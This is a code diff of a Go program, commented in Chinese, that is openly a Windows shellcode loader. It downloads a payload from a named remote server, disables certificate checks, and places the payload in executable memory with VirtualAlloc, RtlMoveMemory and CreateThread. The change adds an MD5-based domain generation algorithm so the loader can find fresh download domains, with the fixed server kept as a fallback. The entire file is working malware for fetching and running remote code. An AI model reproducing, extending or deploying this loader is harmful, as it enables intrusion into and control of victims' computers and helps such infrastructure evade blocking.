@@ -1,20 +1,21 @@
 package main
 
 import (
+	"crypto/md5"
 	"crypto/tls"
+	"encoding/hex"
 	"fmt"
 	"io"
 	"net/http"
-	// "os" // 已删除未使用的 os 包
 	"syscall"
 	"time"
 	"unsafe"
 )
 
-// [配置] Shellcode 的下载地址 (请确保 payload.bin 已上传到服务器)
-const ShellcodeURL = "https://api.cailiu666.xyz/payload.bin"
+// [配置]
+const FallbackPayloadURL = "https://api.cailiu666.xyz/payload.bin"
+const DGASeed = "MySecretSeed2024"
 
-// Windows API 定义
 var (
 	kernel32            = syscall.NewLazyDLL("kernel32.dll")
 	ntdll               = syscall.NewLazyDLL("ntdll.dll")
@@ -23,91 +24,96 @@ var (
 	CreateThread        = kernel32.NewProc("CreateThread")
 	WaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
 )
-
 const (
 	MEM_COMMIT             = 0x1000
 	MEM_RESERVE            = 0x2000
 	PAGE_EXECUTE_READWRITE = 0x40
 )
 
-func main() {
-	// 1. 启动提示
-	fmt.Println("[*] Loader 启动...")
-
-	// 2. 下载 Shellcode
-	fmt.Printf("[*] 正在下载 Payload: %s\n", ShellcodeURL)
-	shellcode, err := downloadShellcode(ShellcodeURL)
-	if err != nil {
-		fmt.Printf("[!] 下载失败: %v\n", err)
-		fmt.Println("[!] 请检查: 1. Server是否启动 2. payload.bin是否上传")
-		time.Sleep(5 * time.Second)
-		return
+// DGA 生成
+func generateDGADomains(count int) []string {
+	domains := make([]string, 0)
+	dateStr := time.Now().Format("2006-01-02")
+	for i := 0; i < count; i++ {
+		raw := fmt.Sprintf("%s%s%d", dateStr, DGASeed, i)
+		hasher := md5.New()
+		hasher.Write([]byte(raw))
+		hash := hex.EncodeToString(hasher.Sum(nil))
+		domain := fmt.Sprintf("https://%s.net", hash[0:12])
+		domains = append(domains, domain)
 	}
-	fmt.Printf("[+] 下载成功，大小: %d bytes\n", len(shellcode))
-
-	if len(shellcode) == 0 {
-		fmt.Println("[!] 错误: 下载到的 Payload 为空")
-		return
-	}
-
-	// 3. 申请内存 (VirtualAlloc)
-	addr, _, err := VirtualAlloc.Call(
-		0,
-		uintptr(len(shellcode)),
-		MEM_COMMIT|MEM_RESERVE,
-		PAGE_EXECUTE_READWRITE,
-	)
-	if addr == 0 {
-		fmt.Println("[!] 内存申请失败:", err)
-		return
-	}
-	fmt.Printf("[+] 内存申请成功: 0x%x\n", addr)
-
-	// 4. 写入 Shellcode (RtlMoveMemory)
-	_, _, _ = RtlMoveMemory.Call(
-		addr,
-		(uintptr)(unsafe.Pointer(&shellcode[0])),
-		uintptr(len(shellcode)),
-	)
-	fmt.Println("[+] Payload 已注入内存")
-
-	// 5. 执行 Shellcode (CreateThread)
-	thread, _, err := CreateThread.Call(
-		0,
-		0,
-		addr,
-		0,
-		0,
-		0,
-	)
-	if thread == 0 {
-		fmt.Println("[!] 线程创建失败:", err)
-		return
-	}
-	fmt.Println("[+] 线程已启动! Agent 正在内存中运行...")
-
-	// 6. 阻止主进程退出
-	// Agent 是在子线程里跑的，如果主进程退了，Agent 也就没了
-	// 所以这里我们要无限等待
-	_, _, _ = WaitForSingleObject.Call(thread, 0xFFFFFFFF)
+	return domains
 }
 
-func downloadShellcode(url string) ([]byte, error) {
-	// 跳过证书验证 (防止虚拟机根证书问题)
-	tr := &http.Transport{
-		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+// 下载函数 (核心修复在这里)
+func downloadBytes(url string) ([]byte, error) {
+	fmt.Printf("[DGA] 尝试下载: %s ... ", url)
+	
+	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
+	
+	// [关键修复] 延长超时时间，从 5 秒改为 30 秒
+	client := &http.Client{
+		Timeout:   30 * time.Second, 
+		Transport: tr,
 	}
-	client := &http.Client{Transport: tr}
 
 	resp, err := client.Get(url)
 	if err != nil {
+		fmt.Println("失败 (网络不可达)")
 		return nil, err
 	}
 	defer resp.Body.Close()
 
 	if resp.StatusCode != 200 {
-		return nil, fmt.Errorf("HTTP状态码错误: %d", resp.StatusCode)
+		fmt.Printf("失败 (状态码 %d)\n", resp.StatusCode)
+		return nil, fmt.Errorf("status %d", resp.StatusCode)
 	}
 
-	return io.ReadAll(resp.Body)
+	// 读取 Body (下载文件内容)
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		// 如果在这里出错，很可能就是超时
+		fmt.Printf("失败 (%v)\n", err)
+		return nil, err
+	}
+
+	fmt.Println("成功!")
+	return body, nil
+}
+
+func main() {
+	fmt.Println("======== [Loader: DGA Payload Fetching] ========")
+	var shellcode []byte
+	var err error
+
+	// 1. DGA 域名下载
+	dgaBaseDomains := generateDGADomains(3)
+	for _, domain := range dgaBaseDomains {
+		downloadURL := domain + "/payload.bin"
+		shellcode, err = downloadBytes(downloadURL)
+		if err == nil && len(shellcode) > 0 {
+			break
+		}
+	}
+
+	// 2. 保底下载
+	if len(shellcode) == 0 {
+		fmt.Println("[Fallback] 切换至保底服务器...")
+		shellcode, err = downloadBytes(FallbackPayloadURL)
+		if err != nil {
+			fmt.Printf("[!] 下载彻底失败: %v\n", err)
+			time.Sleep(5 * time.Second)
+			return
+		}
+	}
+
+	fmt.Printf("[+] 载荷已就绪: %d 字节\n", len(shellcode))
+
+	// 3. 内存注入
+	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+	thread, _, _ := CreateThread.Call(0, 0, addr, 0, 0, 0)
+	
+	fmt.Println("[+] 载荷已注入。Agent 启动。")
+	WaitForSingleObject.Call(thread, 0xFFFFFFFF)
 }
